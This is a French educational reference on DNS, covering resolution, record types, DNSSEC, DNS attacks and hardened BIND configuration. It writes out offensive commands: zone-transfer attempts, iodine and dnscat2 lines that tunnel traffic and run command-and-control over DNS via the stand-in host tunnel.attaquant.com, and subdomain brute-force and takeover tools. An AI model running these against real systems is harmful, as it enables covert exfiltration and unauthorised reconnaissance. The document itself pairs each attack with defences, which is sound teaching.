---
title: DNS en profondeur
domain: sciences-appliquées
subdomain: informatique / sécurité / réseau
tags: [dns, dnssec, rebinding, amplification, zone-transfer, sécurité, réseau]
date: 2026-03-22
---

# DNS en profondeur

## Architecture DNS

```
Hiérarchie DNS :

                     . (root)
                    / | \
                  /   |   \
               .com  .org  .fr
               /              \
          google.com        example.fr
          /       \
      www        mail
```

### Types de serveurs

| Type | Rôle |
|---|---|
| Resolver récursif | Reçoit la requête du client, interroge la hiérarchie pour lui |
| Root Name Server | 13 serveurs (A-M.root-servers.net), connaissent les serveurs TLD |
| TLD Name Server | Connaissent les serveurs autoritaires pour chaque domaine |
| Serveur autoritaire | Détient la zone DNS du domaine, répond avec autorité |

### Résolution récursive

```
Client → Resolver : Qui est www.example.com ?
Resolver → Root : Qui est www.example.com ?
Root → Resolver : Je ne sais pas, demande à .com (ns1.verisign.com)
Resolver → .com NS : Qui est www.example.com ?
.com NS → Resolver : Je ne sais pas, demande à example.com (ns1.example.com)
Resolver → ns1.example.com : Qui est www.example.com ?
ns1.example.com → Resolver : C'est 93.184.216.34 (TTL: 3600)
Resolver → Client : 93.184.216.34
```

## Types d'enregistrements DNS

| Type | Usage | Exemple |
|---|---|---|
| A | IPv4 | `www A 93.184.216.34` |
| AAAA | IPv6 | `www AAAA 2606:2800:21f::34` |
| CNAME | Alias vers un autre nom | `blog CNAME www.example.com` |
| MX | Serveur mail (avec priorité) | `@ MX 10 mail.example.com` |
| NS | Serveur de noms de la zone | `@ NS ns1.example.com` |
| TXT | Texte arbitraire (SPF, DKIM, vérification) | `@ TXT "v=spf1 include:sendgrid.net ~all"` |
| SOA | Start of Authority — métadonnées de zone | Serial, refresh, retry, expire |
| PTR | Reverse DNS (IP → nom) | `34.216.184.93.in-addr.arpa PTR www.example.com` |
| SRV | Service et port | `_sip._tcp SRV 10 20 5060 sip.example.com` |
| CAA | Certificate Authority Authorized | `@ CAA 0 issue "letsencrypt.org"` |
| DKIM | Clé publique pour signature des emails | `_domainkey TXT "v=DKIM1; k=rsa; p=..."` |

```bash
# Interroger les types d'enregistrements
dig A www.example.com
dig MX example.com
dig NS example.com
dig TXT example.com
dig ANY example.com     # Tous les types (souvent limité)
dig AAAA www.google.com

# Requête vers un serveur DNS spécifique
dig @8.8.8.8 example.com
dig @1.1.1.1 example.com +short  # Réponse courte

# Reverse DNS
dig -x 93.184.216.34
```

## Zone Transfer (AXFR)

Le transfert de zone permet à un serveur secondaire de copier la zone entière depuis le serveur primaire. Mal configuré, il expose toute l'infrastructure DNS.

```bash
# Tenter un transfert de zone (reconnaissance)
dig AXFR @ns1.target.com target.com
host -t AXFR target.com ns1.target.com
dnsrecon -d target.com -t axfr

# Si réussi → liste complète de tous les sous-domaines et IPs
# target.com.       SOA  ns1.target.com. admin.target.com. ...
# www.target.com.   A    93.184.216.34
# mail.target.com.  A    10.0.0.5
# internal.target.com. A 192.168.1.100    ← Infrastructure interne exposée !
# vpn.target.com.   A    203.0.113.5
```

```
Contre-mesure :
- Restreindre AXFR aux seules IPs des serveurs secondaires légitimes
- Activer TSIG (Transaction Signature) pour authentifier les transferts
```

## DNSSEC

DNSSEC ajoute une couche de signature cryptographique pour garantir l'authenticité et l'intégrité des réponses DNS.

### Enregistrements DNSSEC

| Type | Rôle |
|---|---|
| DNSKEY | Clé publique de la zone (KSK + ZSK) |
| RRSIG | Signature cryptographique d'un jeu d'enregistrements |
| DS | Délégation de signature — hash de la clé enfant (chaîne de confiance) |
| NSEC/NSEC3 | Preuve de non-existence (un nom n'existe pas dans la zone) |

### Chaîne de confiance

```
Root → signé par la clé root (connue et distribuée dans les OS)
  ↓ DS
.com → signé par la clé .com
  ↓ DS
example.com → signé par la clé example.com
  ↓ RRSIG
www.example.com A 93.184.216.34 → réponse signée
```

```bash
# Vérifier DNSSEC d'un domaine
dig +dnssec DNSKEY example.com
dig +dnssec A www.example.com  # Inclut RRSIG dans la réponse
delv @8.8.8.8 www.example.com A  # Validation DNSSEC (dnssec-lookaside)

# Tester avec Unbound
unbound-host -D -v www.example.com
```

## Attaques DNS

### DNS Cache Poisoning

Injecter une fausse réponse dans le cache d'un resolver pour rediriger les utilisateurs.

```
Attaque de Kaminsky (2008) :
1. Demander un sous-domaine inexistant : random.target.com
2. Envoyer massivement des fausses réponses avec différents IDs de transaction
3. Objectif : faire accepter une réponse Authority NS falsifiée pour target.com
4. Si acceptée → tout le trafic vers target.com est redirigé

Protection : randomisation du port source + ID de transaction (tous les resolvers modernes)
DNSSEC : signature cryptographique rend le poisoning impossible
```

### DNS Rebinding

Contourne la Same-Origin Policy via des TTL courts et le changement d'IP.

```
Scénario :
1. Attaquant enregistre attaquant.com avec TTL = 1 seconde
2. Victime charge https://attaquant.com/exploit.js
3. Le script JavaScript attend que le cache DNS expire (1s)
4. Attaquant change l'IP de attaquant.com vers 192.168.1.1 (routeur de la victime)
5. Le script JavaScript refait une requête vers attaquant.com
6. Le navigateur résout attaquant.com → 192.168.1.1 (même "origin" pour le navigateur)
7. Le script peut maintenant lire la réponse du routeur (interface admin locale)

Impact : accès à des services internes non exposés sur internet
```

```bash
# Outil de test : singularity of origin
# https://github.com/nccgroup/singularity

# Protection :
# - Serveurs locaux : vérifier l'en-tête Host et rejeter les requêtes avec un Host inattendu
# - DNS rebinding protection dans les resolvers (filtrer les réponses avec IPs privées)
# - Chrome/Firefox : protections partielles intégrées
```

### Amplification DNS (DDoS)

```
Principe :
1. Attaquant envoie des requêtes DNS avec l'IP source forgée (victime)
2. Les requêtes ANY ou DNSKEY produisent de grandes réponses
3. Les serveurs DNS envoient les réponses à la victime
4. Facteur d'amplification : jusqu'à 50x (requête 40 octets → réponse 2000+ octets)

Protection côté résolveur :
- Rate limiting par IP source
- Désactiver les réponses ANY trop volumineuses
- Response Rate Limiting (RRL) dans BIND/Unbound
```

### DNS Tunneling

Exfiltration de données via des requêtes DNS (contourne les firewalls qui bloquent tout sauf le DNS).

```bash
# Principe : encoder des données dans des sous-domaines
# data.chunk1.attaquant.com → le serveur DNS de attaquant.com reçoit "chunk1"

# Outil : iodine (tunnel IP over DNS)
# Côté serveur
iodined -f 10.0.0.1 tunnel.attaquant.com

# Côté client
iodine -f 8.8.8.8 tunnel.attaquant.com
# → Interface réseau tunnel créée → traffic IP passe par DNS

# dnscat2 — C2 over DNS
# ruby dnscat2.rb --dns "domain=tunnel.attaquant.com,host=0.0.0.0"

# Détection :
# - Sous-domaines très longs (encodage base32/64 des données)
# - Haute fréquence de requêtes vers un domaine
# - Types de requêtes inhabituels (TXT, CNAME à haute fréquence)
# - Faibles TTL
```

## Énumération DNS (Reconnaissance)

```bash
# Brute-force de sous-domaines
dnsrecon -d target.com -D /usr/share/wordlists/dnsmap.txt -t brt
fierce --domain target.com
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Subdomain takeover — sous-domaine CNAME vers service désactivé
# sub.target.com CNAME deleted-app.azurewebsites.net
# Si azurewebsites.net n'est plus réservé → l'attaquant peut le récupérer
subjack -w subdomains.txt -t 100 -timeout 30 -ssl

# Reconnaissance passive (sans interroger les DNS cibles)
# Certificate Transparency Logs
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value'
# amass, subfinder
subfinder -d target.com -silent
amass enum -passive -d target.com

# Reverse DNS sur une plage IP
for i in $(seq 1 254); do host 192.168.1.$i; done 2>/dev/null | grep "domain name"
```

## Configuration sécurisée

```bash
# BIND — restreindre le transfert de zone
options {
    allow-transfer { none; };  # Par défaut, personne
};

zone "example.com" {
    type master;
    allow-transfer { 192.168.1.2; };  # Seulement le serveur secondaire
    allow-query { any; };
};

# Activer TSIG pour les transferts
dnssec-keygen -a HMAC-SHA256 -b 256 -n HOST transfer-key
# → Utiliser la clé dans les configurations primaire et secondaire

# Response Rate Limiting (anti-amplification)
options {
    rate-limit {
        responses-per-second 5;
        window 5;
    };
};
```
